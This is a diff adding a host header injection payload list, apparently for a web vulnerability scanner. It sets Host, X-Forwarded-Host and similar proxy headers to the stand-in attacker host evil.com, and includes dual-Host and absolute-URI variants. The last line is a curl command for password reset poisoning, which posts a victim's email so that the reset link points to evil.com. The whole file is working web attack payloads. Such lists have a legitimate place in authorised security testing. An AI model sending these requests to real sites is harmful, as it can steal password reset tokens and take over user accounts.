@@ -1,0 +1,27 @@
+# Host Header Injection Payloads — cyberm4fia-scanner
+# Categories: Standard Headers, Dual Host, Password Reset Poisoning
+
+# ─── Core Host Headers ───
+Host: evil.com
+Host: target.com:@evil.com
+
+# ─── Proxy Headers (forwarded host overrides) ───
+X-Forwarded-Host: evil.com
+X-Host: evil.com
+X-Forwarded-Server: evil.com
+X-HTTP-Host-Override: evil.com
+Forwarded: host=evil.com
+X-Original-Host: evil.com
+X-Forwarded-For: evil.com
+X-Rewrite-URL: evil.com
+
+# ─── Dual Host ───
+Host: target.com
+Host: evil.com
+
+# ─── Absolute URI in Request Line ───
+GET https://evil.com/reset HTTP/1.1
+Host: target.com
+
+# ─── Password Reset Poisoning Test ───
+curl -s https://target.com/reset -d 'email=victim@x.com' -H 'Host: evil.com' -H 'X-Forwarded-Host: evil.com'
